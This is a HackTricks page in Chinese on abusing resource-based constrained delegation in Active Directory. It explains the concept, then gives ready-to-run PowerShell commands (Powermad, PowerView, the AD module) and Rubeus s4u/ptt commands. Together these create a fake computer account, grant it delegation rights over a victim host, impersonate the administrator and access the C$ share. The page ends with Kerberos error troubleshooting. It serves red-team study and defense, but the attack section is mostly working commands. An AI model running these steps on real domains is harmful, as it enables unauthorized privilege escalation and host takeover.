# 基于资源的受限委派

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基于资源的受限委派基础

这与基本的[受限委派](constrained-delegation.md)类似，但**不同之处**在于它是给予**对象**权限去**冒充任何用户对服务进行操作**。基于资源的受限委派**设置**了**能够冒充任何用户对其进行操作的对象**。

在这种情况下，受限对象将具有一个名为 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 的属性，其中包含了可以冒充任何其他用户对其进行操作的用户的名称。

这种受限委派与其他委派的另一个重要区别在于，任何拥有**对机器账户的写权限**（_GenericAll/GenericWrite/WriteDacl/WriteProperty等_）的用户都可以设置 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_（在其他形式的委派中，您需要域管理员权限）。

### 新概念

在受限委派中提到，用户的 _userAccountControl_ 值中的 **`TrustedToAuthForDelegation`** 标志是执行 **S4U2Self** 所必需的。但这并不完全正确。\
实际上，即使没有该值，如果您是一个**服务**（拥有SPN），您也可以对任何用户执行 **S4U2Self**，但是，如果您**拥有 `TrustedToAuthForDelegation`**，返回的TGS将是**可转发的**，如果您**没有**该标志，返回的TGS**不会**是**可转发的**。

然而，如果在 **S4U2Proxy** 中使用的 **TGS** 是**不可转发的**，尝试滥用**基本受限委派**将**不会起作用**。但是如果您尝试利用**基于资源的受限委派，它将起作用**（这不是一个漏洞，这是一个特性，显然）。

### 攻击结构

> 如果您对**计算机**账户拥有**相当于写权限的特权**，您可以获得该机器的**特权访问**。

假设攻击者已经**对受害计算机拥有相当于写权限的特权**。

1. 攻击者**危及**一个拥有**SPN**的账户或**创建一个**（“服务A”）。注意，**任何**_管理员用户_ 在没有任何其他特殊权限的情况下，可以**创建**多达10个**计算机对象**（_**MachineAccountQuota**_**）**并为它们设置**SPN**。因此，攻击者可以简单地创建一个计算机对象并设置一个SPN。
2. 攻击者**滥用其对受害计算机（服务B）的写权限**，配置**基于资源的受限委派以允许服务A冒充任何用户**对该受害计算机（服务B）进行操作。
3. 攻击者使用Rubeus执行**完整的S4U攻击**（S4U2Self和S4U2Proxy）从服务A到服务B，针对**对服务B有特权访问的用户**。
   1. S4U2Self（来自被危及/创建的SPN账户）：请求一个**以我为目标的管理员TGS**（不可转发）。
   2. S4U2Proxy：使用前一步骤中的**不可转发TGS**请求一个从**管理员**到**受害主机**的**TGS**。
   3. 即使您使用的是不可转发的TGS，由于您正在利用基于资源的受限委派，它将起作用。
4. 攻击者可以**传递票据**并**冒充**用户以**访问受害服务B**。

要检查域的 _**MachineAccountQuota**_，您可以使用：
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻击

### 创建计算机对象

您可以使用 [powermad](https://github.com/Kevin-Robertson/Powermad) 在域内创建计算机对象：
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../.gitbook/assets/b1.png)
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### 配置基于资源的受限委派

**使用 activedirectory PowerShell 模块**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
![](../../.gitbook/assets/B2.png)

**使用 powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 执行完整的 S4U 攻击

首先，我们使用密码 `123456` 创建了新的计算机对象，因此我们需要该密码的哈希值：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
这将打印该账户的RC4和AES哈希值。
现在，可以执行攻击：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
您可以使用Rubeus的`/altservice`参数一次性生成更多的票据：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
请注意，用户有一个称为“**不能被委派**”的属性。如果用户的这个属性为True，你将无法冒充他。这个属性可以在bloodhound中看到。
{% endhint %}

![](../../.gitbook/assets/B3.png)

### 访问

最后一条命令行将执行**完整的S4U攻击，并将管理员的TGS注入到**内存**中的受害主机**。\
在这个例子中，它请求了管理员的**CIFS**服务的TGS，所以你将能够访问**C$**：
```bash
ls \\victim.domain.local\C$
```
### 滥用不同的服务票据

了解[**可用的服务票据在这里**](silver-ticket.md#available-services)。

## Kerberos 错误

* **`KDC_ERR_ETYPE_NOTSUPP`**: 这意味着kerberos被配置为不使用DES或RC4，而你只提供了RC4哈希。至少提供AES256哈希给Rubeus（或者只提供rc4, aes128和aes256哈希）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: 这意味着当前计算机的时间与DC的时间不同，kerberos无法正常工作。
* **`preauth_failed`**: 这意味着提供的用户名+哈希无法登录。在生成哈希时，你可能忘记在用户名中加入"$"（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
* **`KDC_ERR_BADOPTION`**: 这可能意味着：
  * 你试图模拟的用户无法访问所需的服务（因为你不能模拟它或者它没有足够的权限）
  * 请求的服务不存在（如果你请求winrm的票据但winrm没有运行）
  * 创建的fakecomputer失去了对易受攻击服务器的权限，你需要重新给予它们。

## 参考资料

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在HackTricks中看到你的**公司广告**或者**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
